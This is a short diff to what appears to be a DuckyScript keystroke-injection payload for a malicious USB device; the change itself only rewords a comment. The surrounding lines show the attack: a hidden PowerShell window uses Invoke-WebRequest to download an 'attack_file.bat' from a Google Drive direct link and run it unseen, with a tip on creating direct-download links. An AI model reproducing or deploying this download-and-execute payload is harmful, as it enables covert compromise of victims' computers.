@@ -19,7 +19,7 @@ REM Downloads the file from google drive and runs it in hidden state
 STRING powershell -w hidden -Command "Invoke-WebRequest -Uri
 DELAY 700
 
-REM Put "attack_file.bat" link which is driect downloadable
+REM Put "attack_file.bat" direct downloadable link
 REM Can use "https://sites.google.com/site/gdocs2direct/" to create direct downloadable link
 STRING '[URL BATCH FILE URL(eg-google drive link)]'
 DELAY 700
